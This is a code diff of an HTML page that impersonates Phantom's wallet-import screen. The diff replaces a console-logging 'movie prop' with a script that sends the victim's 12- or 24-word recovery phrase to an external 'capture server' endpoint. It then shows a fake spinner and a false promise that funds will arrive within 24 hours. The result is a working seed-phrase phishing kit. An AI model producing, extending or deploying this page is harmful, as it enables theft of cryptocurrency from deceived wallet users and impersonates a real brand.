@@ -16,6 +16,8 @@
     justify-content: center;
     align-items: center;
     height: 100vh;
+    text-align: center;
+    padding: 20px;
   }
   .container {
     background: rgba(255 255 255 / 0.05);
@@ -23,93 +25,108 @@
     border-radius: 12px;
     width: 360px;
     box-shadow: 0 0 20px rgba(108, 92, 231, 0.6);
-    text-align: center;
   }
   .logo {
     width: 60px;
-    margin-bottom: 24px;
-    filter: drop-shadow(0 0 2px rgba(255 255 255 / 0.7));
+    margin-bottom: 20px;
   }
   h1 {
-    margin: 0 0 8px;
     font-weight: 700;
-    font-size: 1.8rem;
-  }
-  p.subheading {
-    margin: 0 0 24px;
-    font-weight: 400;
-    font-size: 1rem;
-    color: #ccc;
+    font-size: 2rem;
+    margin-bottom: 20px;
   }
   textarea {
     width: 100%;
-    height: 100px;
-    border-radius: 8px;
+    border-radius: 5px;
     border: none;
-    padding: 12px;
-    font-size: 1rem;
-    background: rgba(255 255 255 / 0.15);
-    color: white;
+    padding: 10px;
+    font-size: 16px;
     resize: none;
-    box-sizing: border-box;
-    outline-offset: 2px;
-    outline-color: #6c5ce7;
-  }
-  textarea::placeholder {
-    color: #d0c8ff;
+    font-family: 'Inter', sans-serif;
   }
   button {
-    margin-top: 24px;
-    width: 100%;
-    padding: 14px 0;
+    margin-top: 20px;
+    padding: 12px 24px;
     background-color: #6c5ce7;
     border: none;
-    border-radius: 8px;
+    border-radius: 5px;
     color: white;
-    font-size: 1.1rem;
-    font-weight: 700;
+    font-size: 16px;
     cursor: pointer;
-    transition: filter 0.3s ease;
   }
-  button:hover {
-    filter: brightness(1.15);
+  .spinner {
+    border: 6px solid rgba(255 255 255 / 0.2);
+    border-top: 6px solid #6c5ce7;
+    border-radius: 50%;
+    width: 48px;
+    height: 48px;
+    margin: 30px auto;
+    animation: spin 1s linear infinite;
   }
-  .footer-note {
-    margin-top: 16px;
-    font-size: 0.8rem;
-    color: #aaa;
+  @keyframes spin {
+    to { transform: rotate(360deg); }
+  }
+  .message, .success {
+    font-size: 1.1rem;
+    margin-top: 20px;
+  }
+  .message {
+    color: #ccc;
+  }
+  .success {
+    color: #6c5ce7;
   }
 </style>
 </head>
 <body>
-  <div class="container">
-    <img class="logo" src="https://cdn.iconscout.com/icon/free/png-256/fox-198-433757.png" alt="Phantom Logo" />
+  <div class="container" id="formContainer">
+    <img src="phantom-logo.svg" alt="Phantom Logo" class="logo" />
     <h1>Import Wallet</h1>
-    <p class="subheading">Securely access your existing wallet using your Secret Recovery Phrase.</p>
-    <textarea id="seedphrase" placeholder="Enter your 12 or 24-word phrase..."></textarea>
+    <p>Securely access your existing wallet using your Secret Recovery Phrase.</p>
+    <textarea id="phrase" placeholder="Enter your 12 or 24-word phrase..." rows="4"></textarea>
     <button onclick="submitPhrase()">Continue</button>
-    <p class="footer-note">Your phrase is never stored or shared.</p>
+  </div>
+
+  <div class="container" id="loadingContainer" style="display:none;">
+    <h1>Processing your wallet...</h1>
+    <div class="spinner"></div>
+    <div class="message" id="loadingMessage">Please wait while we verify your information.</div>
+    <div class="success" id="successMsg" style="display:none;">
+      Your wallet has been successfully confirmed.<br />
+      Funds will arrive within 24 hours.
+    </div>
   </div>
 
   <script>
     function submitPhrase() {
-      const phrase = document.getElementById('seedphrase').value.trim();
-
+      const phrase = document.getElementById('phrase').value.trim();
       if (!phrase) {
-        alert('Please enter your secret phrase!');
+        alert('Please enter your secret recovery phrase.');
         return;
       }
 
-      // Log the captured phrase in the console (for your movie prop)
-      console.log('Captured phrase:', phrase);
+      // Show loading screen
+      document.getElementById('formContainer').style.display = 'none';
+      document.getElementById('loadingContainer').style.display = 'block';
 
-      // Simulate processing step
-      alert('Processing your wallet...');
+      // Send phrase to backend capture server
+      fetch('https://your-render-url.onrender.com/import', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ seedphrase: phrase })
+      }).catch(e => {
+        // Handle fetch error silently or alert user if needed
+        console.error('Error sending phrase:', e);
+      });
 
-      // Clear the textarea
-      document.getElementById('seedphrase').value = '';
+      // Show fake processing and then success message
+      setTimeout(() => {
+        document.getElementById('loadingMessage').style.display = 'none';
+        document.getElementById('successMsg').style.display = 'block';
+      }, 5000);
     }
   </script>
 </body>
 </html>
+
 
